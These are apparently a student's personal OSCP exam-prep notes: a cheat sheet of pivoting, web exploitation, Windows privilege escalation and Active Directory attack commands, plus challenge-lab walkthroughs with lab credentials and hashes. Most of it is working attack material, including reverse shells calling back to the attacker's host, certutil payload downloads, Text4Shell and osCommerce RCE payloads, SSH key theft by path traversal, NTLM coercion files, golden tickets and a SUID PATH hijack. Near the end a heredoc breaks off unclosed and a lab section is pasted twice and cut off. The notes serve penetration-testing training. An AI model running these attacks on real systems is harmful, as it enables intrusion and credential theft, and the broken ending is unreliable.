# OSCP Complete Notes — Halie

---

## General Tips & Gotchas

- **No GPU on Kali VM** — use John (CPU) for all cracking. hashcat OpenCL fails.
- **Revert VM** when exploit keeps failing (dirty state from prior attempts).
- **Lab IPs always differ from module text** — verify with `nxc smb`.
- **Clock skew fix**: `sudo ntpdate <DC_IP>` before any Kerberos attack.
- **proxychains nmap needs sudo**: `sudo proxychains nmap`
- **davserver port flag is capital -P**: `davserver -H 0.0.0.0 -P 80 -D /dir -n`

### Hash Format Map (John ↔ Hashcat)
| Hash Type | John Format | Hashcat -m |
|---|---|---|
| MD5 | `raw-md5` | 0 |
| SHA1 | `raw-sha1` | 100 |
| NTLM | `NT` | 1000 |
| KeePass | `KeePass` | 13400 |
| AS-REP | `krb5asrep` | 18200 |
| TGS/Kerberoast | `krb5tgs` | 13100 |
| Net-NTLMv2 | `netntlmv2` | 5600 |
| SSH key | `SSH` (ssh2john) | 22921 |
| DCC2 (cached) | `mscash2` | 2100 |
| Atlassian PKCS5S2 | `atlassian` | — |

### John Rules Gotchas
- `--rules=NAME` matches `[List.Rules:NAME]` in john.conf (NOT a file path)
- Append literal `$` needs `$$` in rules
- Add custom rules via `sudo tee -a /etc/john/john.conf <<'EOF'` (quoted heredoc)
- KDF cost drives rule choice: high iterations = plain wordlist only
- Custom AD rule: `[List.Rules:capstone]` with `:` / `$1` / `$!`

---

## Tunneling & Port Forwarding

### Socat
```bash
socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>
# Use ports >1024 (no root). fork keeps alive for multiple connections.
```

### SSH Local Port Forward
```bash
ssh -N -L 0.0.0.0:<LPORT>:<DEST_IP>:<DEST_PORT> <user>@<SSH_SERVER>
# Listener on pivot, forwards through SSH server.
```

### SSH Remote Port Forward
```bash
ssh -N -R 127.0.0.1:<LPORT>:<DEST_IP>:<DEST_PORT> kali@<KALI_IP>
# Listener on Kali (loopback). Use when firewall blocks inbound to pivot.
# Need: sudo systemctl start ssh on Kali first
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ...
```

### SSH Dynamic Remote (SOCKS Proxy)
```bash
ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 9997 kali@<KALI_IP>
# SOCKS5 proxy on Kali:9997
# proxychains.conf: socks5 127.0.0.1 9997
```

### Windows OpenSSH
```
C:\Windows\System32\OpenSSH\ssh.exe  # same syntax, all -L/-R/-N/-D flags work
```

### Chisel
```bash
# Kali (server):
chisel server --reverse --port 8080

# Pivot (client) — SOCKS:
/tmp/chisel client <KALI_IP>:8080 R:socks &
# proxychains.conf: socks5 127.0.0.1 1080

# Pivot (client) — port forward:
/tmp/chisel client <KALI_IP>:8080 R:8888:<DEST_IP>:<DEST_PORT> &
# connect via 127.0.0.1:8888 (no proxychains needed)

# Gotchas:
# - use different port than nc listener
# - "Text file busy" = kill stale chisel PIDs
# - --reverse required on server
# - transfer via wget from Kali python3 http.server
```

### DNS Tunneling
```bash
nslookup -type=TXT give-me.cat-facts.internal <DNS_SERVER_IP>
dig TXT @<IP>
# Use internal DNS resolver, NOT 8.8.8.8
# DNSCAT2 port forward: listen 127.0.0.1:4455 172.16.X.217:4646
# Run listen BEFORE connecting client
```

### Internal Host Discovery
```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.X.$i 445; done
# timed out = no host; refused = host but port closed; succeeded = open
```

### TTY Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Web Application Attacks

### CVE-2021-41773 (Apache 2.4.49 Directory Traversal)
```bash
# file read:
curl -s --path-as-is "http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# steal SSH keys:
curl -s --path-as-is "http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/<user>/.ssh/id_rsa"

# RCE (requires ExecCGI enabled):
curl -s --path-as-is "http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

### CVE-2022-26134 (Confluence OGNL)
- Partially URL-encoded payload — do NOT re-encode `./-`
- Post-foothold: `ip addr`, `ip route`
- Loot: `/var/atlassian/application-data/confluence/confluence.cfg.xml` (DB creds)
- John format for PKCS5S2: `--format=atlassian` + fasttrack.txt

### osCommerce 2.3.4.1 RCE (50128.py)
```bash
# requires /install directory still present
python3 50128.py http://<IP>/catalog

# output reads from: /catalog/install/includes/configure.php
# use // not /* to avoid "unterminated comment" PHP error
# passthru() works even when system() is disabled
# base64 encode commands to avoid special char issues

# RCE helper script:
cat > /tmp/rce.sh << 'EOF'
#!/bin/bash
B64=$(echo -n "$1" | base64 -w0)
curl -s -X POST "http://<IP>/catalog/install/install.php?step=4" \
  --data "DB_DATABASE=');passthru(base64_decode('${B64}'));//&submit=submit" > /dev/null
sleep 0.5
curl -s "http://<IP>/catalog/install/includes/configure.php"
EOF
chmod +x /tmp/rce.sh
```

### WordPress Plugin Duplicator (CVE-2020-11738)
```bash
python3 50420.py http://<IP> /home/<user>/.ssh/id_rsa
```

### MSSQL xp_cmdshell
```sql
-- 4 SEPARATE requests to enable:
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
-- then:
EXECUTE xp_cmdshell 'whoami';
```
```bash
# file transfer via certutil:
EXECUTE xp_cmdshell 'certutil -urlcache -f http://KALI/nc.exe c:/windows/temp/nc.exe'
EXECUTE xp_cmdshell 'c:/windows/temp/nc.exe KALI 4444 -e cmd.exe'
```

### S3/MinIO Enumeration
```bash
# host header required for bucket enum:
curl -s "http://<IP>/" -H "Host: s3.<domain>"

# list buckets:
aws s3 ls --endpoint-url http://<IP> --no-sign-request

# list specific bucket:
aws s3 ls s3://<bucket> --endpoint-url http://<IP> --no-sign-request

# upload file:
aws s3 cp shell.php s3://<bucket>/shell.php --endpoint-url http://<IP> --no-sign-request
```

---

## Windows Privilege Escalation

### Service Binary Hijacking
```bash
# enum running services:
Get-CimInstance win32_service | Select Name,State,PathName | Where-Object{$_.State -like 'Running'}

# check permissions:
icacls <path>
# Want: Users:(F) or Authenticated Users:(M)

# compile replacement:
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# restart service:
net stop <service>; net start <service>
# or: shutdown /r /t 0 (if Auto + SeShutdown)
```

### DLL Hijacking
- Target app loads missing DLL from its directory (first in search order)
- Procmon: filter `CreateFile` + DLL name → `NAME NOT FOUND`
```bash
x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
```

### Unquoted Service Paths
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```
```powershell
Get-UnquotedService  # PowerUp
Write-ServiceBinary  # PowerUp
```

### SeImpersonatePrivilege → GodPotato
```powershell
# upload:
upload /tmp/GodPotato-NET4.exe
upload /tmp/nc.exe

# reverse shell:
.\GodPotato-NET4.exe -cmd "nc.exe <KALI_IP> 443 -e cmd.exe"

# direct command (outbound blocked):
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"

# add local admin:
.\GodPotato-NET4.exe -cmd "net user hacker Password123! /add"
.\GodPotato-NET4.exe -cmd "net localgroup administrators hacker /add"

# Sources:
# https://github.com/BeichenDream/GodPotato (pre-built .NET4 binary)
# Real sizes: PrintSpoofer64 ~27KB, GodPotato ~57KB
# Corrupt download: certutil transfers, verify byte count
```

### Scheduled Task Hijack
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run: Run As User"
# Look for writable exe path running as SYSTEM/admin
# Replace binary, wait for schedule
```

### SeBackupPrivilege → ntds.dit
```powershell
# diskshadow script (MUST use CRLF \r\n line endings!):
$content = "set verbose on`r`nset metadata C:\Windows\Temp\meta.cab`r`nset context clientaccessible`r`nset context persistent`r`nbegin backup`r`nadd volume C: alias ine`r`ncreate`r`nexpose %ine% E:`r`nend backup"
[System.IO.File]::WriteAllText("C:\Windows\Temp\ine.txt", $content)
diskshadow /s C:\Windows\Temp\ine.txt

# copy ntds.dit from shadow copy:
robocopy /b e:\windows\ntds . ntds.dit
reg save hklm\system system
reg save hklm\sam sam
reg save hklm\security security
```
```bash
# offline dump:
impacket-secretsdump -ntds ntds.dit -system system LOCAL
impacket-secretsdump -sam sam -system system -security security LOCAL
```

### Hive Dump → PtH
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-wmiexec -hashes :<NThash> Administrator@<IP>
```

---

## Active Directory Attacks

### AS-REP Roasting
```bash
# from Kali:
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile asrep.hash

# from Windows:
.\Rubeus.exe asreproast /nowrap

# crack:
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
```

### Kerberoasting
```bash
# from Kali:
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hash

# from Windows:
.\Rubeus.exe kerberoast /nowrap

# crack:
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
```

### Targeted Kerberoast (GenericWrite)
```bash
# set SPN via bloodyAD:
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC_IP> \
  set object <target> servicePrincipalName -v 'fake/spn.domain.com'

# then roast:
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> \
  -request-user <target> -outputfile target_kerb.hash
```

### ACL Abuse
```powershell
# GenericAll on user → password reset:
Set-DomainUserPassword -Identity <user> \
  -AccountPassword (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)

# GenericAll on group → add member:
Add-DomainGroupMember -Identity "Management Department" -Members <user>
```

```bash
# bloodyAD (most reliable from Kali):
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC_IP> \
  set password <target> 'NewPass123!'
```

### Pass-the-Hash (PtH)
```bash
evil-winrm -i <IP> -u <user> -H <NThash>
impacket-wmiexec -hashes :<NThash> Administrator@<IP>
impacket-psexec <domain>/<user>@<IP> -hashes :<NThash>
nxc smb <IP> -u <user> -H <NThash>
# Note: only works for domain accounts + built-in local Administrator
```

### Overpass-the-Hash (OPtH)
```bash
# Windows (mimikatz):
sekurlsa::pth /user:jen /domain:corp.com /ntlm:<hash> /run:powershell
# new PS window → net use \\files04 (triggers TGT) → klist

# Kali:
impacket-getTGT <domain>/<user> -hashes :<NThash>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>
```

### Pass-the-Ticket (PtT)
```powershell
sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>
klist  # verify
```

### NTLM Relay
```bash
# check signing first:
nxc smb <targets> 2>/dev/null | grep signing

# relay:
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target_IP>

# coerce with SCF:
cat > @trigger.scf << 'EOF'
[Shell]
Command=2
IconFile=\\<KALI_IP>\share\test.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Library-ms file:
cat > config.Library-ms << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>\\<KALI_IP>\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF
```

### Net-NTLMv2 Capture (Responder)
```bash
sudo responder -I eth0
# coerce: dir \\KALI\share
# crack: john --format=netntlmv2 hash.txt
# ntlm_theft.py: python3 ntlm_theft.py -g lnk -s <KALI_IP> -f Update
```

### Phishing via swaks
```bash
sudo swaks --to <target>@<domain> \
  --from <sender>@<domain> \
  --attach @/tmp/config.Library-ms \
  --server <MAILSRV_IP> \
  --body @body.txt \
  --header "Subject: Important Update" \
  --suppress-data -ap
```

### DCSync
```powershell
# mimikatz:
lsadump::dcsync /user:corp\Administrator
```
```bash
# Kali:
impacket-secretsdump -just-dc <domain>/<admin>:<pass>@<DC_IP>
impacket-secretsdump -k -no-pass <domain>/<user>@<DC_IP>
```

### Golden Ticket
```bash
# Windows (mimikatz):
# lsadump::lsa /patch (on DC) to get krbtgt hash
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:<SID> /krbtgt:<HASH> /ptt
misc::cmd

# Kali:
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.com Administrator
export KRB5CCNAME=Administrator.ccache
```

### Extra SID Golden Ticket (Cross-Forest/Child→Parent)
```bash
# 1. Get domain SIDs:
impacket-lookupsid <child_domain>/Administrator@<DC_IP> -hashes :<NThash> | grep "Domain SID"
# OR from compromised DC: nltest /domain_trusts /v

# 2. Forge ticket (use AES256 — more reliable than NTLM):
impacket-ticketer \
  -aesKey <child_krbtgt_aes256> \
  -domain <child.domain> \
  -domain-sid <child_SID> \
  -extra-sid <parent_SID>-519 \
  Administrator

# 3. Use ticket:
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <child_domain>/Administrator@DC01.<parent_domain>

# 4. evil-winrm with Kerberos:
evil-winrm -i DC01.<parent_domain> -u Administrator -r <PARENT_DOMAIN>

# Enterprise Admins SID = parent SID + -519
```

### krb5.conf for Cross-Domain Kerberos
```bash
sudo tee /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = CHILD.DOMAIN.XYZ
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    CHILD.DOMAIN.XYZ = {
        kdc = <child_DC_IP>
        admin_server = <child_DC_IP>
    }
    PARENT.DOMAIN.XYZ = {
        kdc = <parent_DC_IP>
        admin_server = <parent_DC_IP>
    }

[domain_realm]
    .child.domain.xyz = CHILD.DOMAIN.XYZ
    .parent.domain.xyz = PARENT.DOMAIN.XYZ
EOF
```

### BloodHound
```bash
# collection (Kali):
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip

# collection (Windows):
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Tools\

# start BloodHound CE (Docker):
sudo docker-compose up -d
firefox http://localhost:8080  # admin/admin

# key queries:
# Node Info → Outbound Object Control
# Pathfinding → Shortest Path to Domain Admins
# Cypher: MATCH p=(u:User {name:"USER@DOMAIN.COM"})-[r]->(n) WHERE r.isacl=true RETURN p
```

### Lateral Movement
```bash
# WMI:
wmic /node:<IP> /user:<user> /password:<pass> process call create "cmd"

# WinRS:
winrs -r:<host> -u:corp\jen -p:Nexus123! "cmd"

# PsExec (requires local admin + ADMIN$ + File/Printer Sharing):
.\PsExec64.exe -i \\<TARGET> -u corp\jen -p Nexus123! cmd
impacket-psexec corp/jen:Nexus123!@<IP>

# evil-winrm:
evil-winrm -i <IP> -u <user> -p '<pass>'
evil-winrm -i <IP> -u <user> -H <NThash>

# DCOM:
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")
```

### Secretsdump
```bash
# remote:
impacket-secretsdump <domain>/<user>:<pass>@<IP>
impacket-secretsdump <domain>/<user>@<IP> -hashes :<NThash>

# offline (SAM):
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# offline (ntds.dit):
impacket-secretsdump -ntds ntds.dit -system system LOCAL

# Always run on every Pwn3d! host — LSA secrets often have plaintext DA creds
```

---

## Quick Reference Commands

```bash
# initial recon:
nmap -sV -sC -p- --min-rate 5000 <IP> -oN scan.txt
nxc smb <IPs> 2>/dev/null

# share enum:
nxc smb <IPs> -u '' -p '' --shares 2>/dev/null
nxc smb <IPs> -u <user> -p '<pass>' --shares 2>/dev/null

# user enum:
nxc smb <DC_IP> -u <user> -p '<pass>' --users 2>/dev/null
nxc smb <IP> -u '' -p '' --rid-brute 2>/dev/null

# credential spray:
nxc smb <IPs> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success 2>/dev/null

# evil-winrm:
evil-winrm -i <IP> -u <user> -p '<pass>'
evil-winrm -i <IP> -u <user> -H <NThash>

# xfreerdp:
xfreerdp /u:<user> /p:'<pass>' /v:<IP> /cert:ignore
xfreerdp /u:<user> /p:'<pass>' /v:<IP>:<PORT> /cert:ignore

# ssh brute with sshpass:
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<IP>

# John cracking:
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# bloodyAD:
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC_IP> set password <target> 'NewPass123!'

# BloodHound:
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip
```

---

## Challenge Labs

### Challenge Lab A — OSCP-A
**Subnet:** 192.168.72.x (standalone) + 10.10.32.x (AD)

#### Standalone Machines
| Host | Vuln | Method |
|---|---|---|
| .143 Aero | Aerospike CVE-2020-13151 | Port **3000** RCE → overwrite /usr/bin/asinfo → cron → root |
| .144 Crystal | Exposed .git + GitHub PAT | git-dumper → Joomla secret → su chloe → sudo bash → root |
| .145 Hermes | WiFi Mouse RCE (EDB 49601) | Port 1978 → PuTTY registry creds → RDP → Administrator |

**Key:** Aerospike client port = 3000 (NOT 3003). `reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s`

#### AD Set (oscp.exam)
```
Eric.Wallows:EricLikesRunning800 (assumed breach on MS01 192.168.72.141)
  → SSH -R dynamic forward (port 9997) → proxychains to 10.10.32.x
  → Kerberoast → web_svc:Diamond1
  → eric.wallows SeImpersonate → GodPotato → SYSTEM on MS01
  → mimikatz → celia.almeda + Mary.Williams NTLM hashes
  → PtH celia.almeda → MS02 (10.10.32.142)
  → C:\windows.old\System32\config\ SAM+SYSTEM
  → secretsdump → tom_admin hash
  → PtH tom_admin → DC01 → domain owned
```

**Key:** `windows.old` contains old SAM/SYSTEM hives — often reused passwords.

---

### Challenge Lab 8 — Poseidon
**Domain:** poseidon.yzx / sub.poseidon.yzx | **Subnet:** 192.168.51.x

| Host | Role |
|---|---|
| .161 DC01 | Parent domain controller (poseidon.yzx) |
| .162 DC02 | Child domain controller (sub.poseidon.yzx) |
| .163 GYOZA | Workstation (assumed breach: Eric.Wallows:EricLikesRunning800) |

```
Eric.Wallows → WinRM GYOZA
  → AS-REP roast sub domain → chen:freedom
  → WinRM as chen → SeImpersonate → GodPotato SYSTEM
  → Dump hives → LSA: LisaWayToGo456 (SNMP svc) + Impossible2Crack4.? (DefaultPassword)
  → net rpc password reset jackie → jackie:jackie123
  → evil-winrm DC02 → SeBackupPrivilege
  → diskshadow VSS snapshot → robocopy ntds.dit → secretsdump DC02
  → krbtgt AES256 + domain SIDs → Extra SID Golden Ticket (-extra-sid <parent_SID>-519)
  → krb5.conf → secretsdump DC01 → PtH Administrator → proof.txt
```

**Key:** diskshadow script = CRLF (`\r\n`). Use AES256 for Golden Ticket. Enterprise Admins = parent SID + `-519`.

---

### Challenge Lab 9 — Feast
**Domain:** feast.com | **Subnet:** 192.168.84.x

| Host | Role |
|---|---|
| .168 | S3/MinIO cloud storage |
| .169 DC01 | Domain Controller |
| .170 MS01 | CloudSync web app (XAMPP/Apache/PHP) |
| .171 MS02 | Windows Server 2019 |

```
S3 enum (Host header: s3.feast.local) → bucket 'storage' (anonymous write)
  → upload shell.php → hydra → Jane.Smith:abc123 → login CloudSync
  → POST sync.php → shell synced → SYSTEM on MS01
  → MySQL root (no pass) → SELECT * FROM cloudsync.users → MD5 hashes
  → john raw-md5 → jeff.borrows:naruto
  → BloodHound → jeff GenericAll over mario.lemieux
  → bloodyAD password reset → mario Pwn3d! MS02
  → secretsdump MS02 LSA → feast\administrator:BigFeast999! (plaintext)
  → evil-winrm DC01 → proof.txt
```

**Key:** S3 Host header trick. MD5 cracks instantly. LSA secrets = plaintext DA creds. bloodyAD for GenericAll.

---

### Challenge Lab 10 — Laser
**Domain:** laser.com | **Subnet:** 192.168.52.x

| Host | Role |
|---|---|
| .172 DC01 | Domain Controller (signing:True) |
| .173 MS01 | Dual-homed, Apps share (READ/WRITE) |
| .174 MS02 | Windows (signing:False) |

```
MS01 Apps share (READ/WRITE) — contains .lnk files
  → ntlm_theft.py + Responder → capture carl.dean Net-NTLMv2
  → ntlmrelayx → MS02 SAM → Administrator:15759746f66f2da88d58f0160f8ee676
  → evil-winrm MS02 → PCAP → yulia.weber:Yulia@Laser777
  → BloodHound → yulia GenericWrite over Boris.Crawford (DA)
  → Targeted Kerberoast Boris → crack
  → evil-winrm DC01 → proof.txt
```

**Key:** `ntlm_theft.py -g lnk -s <KALI_IP> -f Update`. `download` in evil-winrm pulls files. RDP blocked for DA — use WinRM.

---

### Challenge Lab 2 — Relia (IN PROGRESS)
**Subnet:** 192.168.72.x

| Host | Notes |
|---|---|
| .245 WEB01 | Linux, Apache 2.4.49, CVE-2021-41773 file read confirmed, SSH key-only port 2222 |
| .246 | Code validation (JS nonce-based, ABCD-1234-1234-12AB format) |
| .247 WEB02 | Windows signing:False, pdfs/ with WelcomeLetter.pdf (emma/zachary) |
| .248 EXTERNAL | DNN portal, **transfer share READ/WRITE**, Eric.Wallows guest |
| .249 LEGACY | XAMPP:8000, RiteCMS, signing:False |

**Anita SSH key:** `curl --path-as-is http://.../.%2e/.%2e/home/anita/.ssh/id_ecdsa` → passphrase: `fireball`

**Pending:** Library-ms phishing → NTLM relay → lateral movement

---

### Challenge Lab 3 — Skylark (IN PROGRESS)
**35 flags** | **Subnet:** 192.168.55.x | **Kali:** 192.168.49.55

| Host | Name | Notes |
|---|---|---|
| .220 | HOUSTON01 | Windows SKYLARK.com, HTTP portal (401), VNC:5900 |
| .221 | AUSTIN02 | Windows SKYLARK.com, IIS, RDP:10000, ports 3387/5504 |
| .222 | PARIS03 | Windows standalone |
| .223 | milan | Linux, osCommerce:60001 (RCE www-data), Froxlor, MySQL root:7NVLVTDGJ38HM2TQ |
| .224 | amsterdam05 | Linux **DUAL-HOMED** +172.16.55.254, SSH:22, Squid:3128 (407 auth needed) |
| .225 | — | Linux, FTP:21, nginx:80, RiteCMS:8090 (admin:admin) |
| .226 | TOKYO07 | Windows standalone |

**Internal (172.16.55.x):** .10-.15, .30-.32, .110-.111 (behind Squid on .224, need creds)

**Confirmed creds:** MySQL root: `7NVLVTDGJ38HM2TQ`, Froxlor DB: `J5EPKLGEA7LR4ZV2`, osCommerce: `admin:admin`

**Pending:** Squid creds for internal pivot, .223 privesc, .225 FTP, Windows domain creds

---

## AD Capstone Quick Reference (corp.com 192.168.52.x)

| Chain | Starting Point | Key Steps |
|---|---|---|
| Chain 1 | pete:Nexus123! | AS-REP → mike:Darkness1099! → spray → Pwn3d! CLIENT75 → secretsdump maria → evil-winrm DC1 |
| Chain 2 | VimForPowerShell123! (leaked) | spray → meg valid → AS-REP dave:Flowers1 → Pwn3d! → secretsdump daveadmin cleartext → RDP DC1 |
| Chain 3 | leon:HomeTaping199! | spray → leon Pwn3d! on FILES04 directly → evil-winrm |
| DCSync | jeffadmin | lsadump::dcsync /user:corp\Administrator → hash 2892d26c... → PtH DC1 |

**Lesson:** Spray first — sometimes you're already on the target.

---

## Challenge Lab 5 — OSCP-B (COMPLETED)
**Subnet:** 192.168.83.x | **Kali:** 192.168.49.83

| Host | Role | Flags |
|---|---|---|
| .147 MS01 | Windows, dual-homed pivot (10.10.43.147) | — |
| 10.10.43.148 MS02 | Windows, MSSQL | — |
| 10.10.43.146 DC01 | Domain Controller oscp.exam | proof.txt ✅ |
| .149 Kiero | Linux, SNMP+FTP+SSH | local.txt + proof.txt ✅ |
| .150 Berlin | Linux, Spring Boot Text4Shell | local.txt + proof.txt ✅ |
| .151 FreeSWITCH | Windows, port 8021 | local.txt + proof.txt ✅ |

### AD Attack Chain
```
Eric.Wallows:EricLikesRunning800 (assumed breach MS01 192.168.83.147)
  → SeImpersonatePrivilege → GodPotato SYSTEM on MS01
  → Dual-homed: 10.10.43.147 internal
  → Chisel SOCKS pivot (socks5 127.0.0.1:1080)
  → Kerberoast → sql_svc:Dolphin1 + web_svc:Diamond1
  → impacket-mssqlclient sql_svc@10.10.43.148 -windows-auth
  → xp_cmdshell enabled → SeImpersonatePrivilege on MS02
  → Files served from MS01 IIS (10.10.43.147:8080) — copy to C:\inetpub\wwwroot\
  → MS02 downloads: powershell iwr http://MS01.oscp.exam:8080/file
  → GodPotato on MS02 → hacker user added → evil-winrm MS02
  → C:\windows.old\Windows\System32\config\ SAM+SYSTEM
  → secretsdump → tom_admin:4979d69d4ca66955c075c41cf45f24dc
  → PtH tom_admin → DC01 evil-winrm → proof.txt: a0178d15e46e8a85b09cd102f8606bf6
```

**Key lessons:**
- IIS requires FQDN hostname not IP — use `MS01.oscp.exam:8080`
- xp_cmdshell CreateProcess error = copy files to path without spaces
- proxychains must use `socks5` not `socks4`
- windows.old SAM hives contain old domain user hashes

---

### .149 Kiero Attack Chain
```
SNMP community: public
  → snmpwalk NET-SNMP-EXTEND-MIB::nsExtendObjects
  → RESET_PASSWD script at /home/john/RESET_PASSWD (SUID root)
  → calls system("echo kiero:kiero | chpasswd") without full path
  → FTP kiero:kiero → downloaded id_rsa, id_rsa_2, id_rsa.pub
  → ssh -i id_rsa john@.149 → john shell → local.txt
  → PATH hijack on RESET_PASSWD:
      echo '#!/bin/bash' > /tmp/chpasswd
      echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/chpasswd
      chmod +x /tmp/chpasswd
      export PATH=/tmp:$PATH
      ~/RESET_PASSWD
  → /tmp/rootbash -p → root → proof.txt
```

**Key lessons:**
- id_rsa in FTP belongs to john not kiero
- PATH hijack requires binary to call command WITHOUT full path
- `rootbash -p` preserves SUID root privileges

---

### .150 Berlin Attack Chain (CVE-2022-42889 Text4Shell + JDWP)
```
/CHANGELOG confirms Apache Commons Text 1.8 → Text4Shell
  → busybox nc payload with %25 suffix:
    curl "http://IP:8080/search?query=<URL_ENCODED_PAYLOAD>%25"
    payload: ${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc KALI 4444 -e sh')}
  → shell as dev → local.txt
  → JDWP privesc: root runs java -Xdebug -Xrunjdwp:...,address=8000
  → SSH reverse tunnel: ssh -f -N -R 8000:localhost:8000 kali@KALI_IP
  → python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc KALI 9999 -e sh'
  → nc 127.0.0.1 5000 (on target) → triggers JDWP event → root shell
  → proof.txt
```

**Key lessons:**
- Use `busybox nc` not regular `nc` for Text4Shell payload
- Add `%25` (encoded %) suffix to payload URL
- Direct nc command works; two-step download+execute does NOT
- JDWP exploit 46501.py requires python2
- Must SSH tunnel port 8000 to Kali — only listens locally
- Connect to port 5000 AFTER starting exploit to trigger breakpoint

---

### .151 FreeSWITCH Attack Chain
```
FreeSWITCH mod_event_socket port 8021
  → default password: ClueCon
  → python3 freeswitch.py IP "whoami" → oscp\chris → local.txt
  → SeImpersonatePrivilege
  → certutil download GodPotato-NET4.exe + nc.exe
  → GodPotato reverse shell → SYSTEM → proof.txt
```

---

### Text4Shell (CVE-2022-42889) Reference
```bash
# URL-encoded payload (use busybox nc + %25 suffix):
curl "http://TARGET:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20KALI%204444%20-e%20sh%27%29%7D%25"

# Python version:
from urllib.parse import quote
payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc KALI 4444 -e sh')}"
encoded = quote(payload, safe='')
requests.get(f"http://TARGET:8080/search?query={encoded}%25")
```

### JDWP Privesc Reference
```bash
# 1. SSH tunnel from target to Kali:
ssh -f -N -R 8000:localhost:8000 kali@KALI_IP

# 2. On Kali - run exploit:
python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc KALI 9999 -e sh'
# waits for: [+] Waiting for an event on 'java.net.ServerSocket.accept'

# 3. On Kali - listener:
nc -lvnp 9999

# 4. On target - trigger event:
nc 127.0.0.1 5000
```

### PATH Hijack Reference (SUID binary)
```bash
# 1. Create malicious version of called command:
cat > /tmp/chpasswd << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

---

## Challenge Lab 5 — OSCP-B (COMPLETED)
**Subnet:** 192.168.83.x | **Kali:** 192.168.49.83

| Host | Role | Flags |
|---|---|---|
| .147 MS01 | Windows, dual-homed pivot (10.10.43.147) | pivot only |
| 10.10.43.148 MS02 | Windows, MSSQL | pivot only |
| 10.10.43.146 DC01 | Domain Controller oscp.exam | proof.txt done |
| .149 Kiero | Linux, SNMP+FTP+SSH | local.txt + proof.txt done |
| .150 Berlin | Linux, Spring Boot Text4Shell | local.txt + proof.txt done |
| .151 FreeSWITCH | Windows, port 8021 | local.txt + proof.txt done |

### AD Attack Chain
```
Eric.Wallows:EricLikesRunning800 (assumed breach MS01)
  -> SeImpersonatePrivilege -> GodPotato SYSTEM on MS01
  -> Dual-homed 10.10.43.147 internal
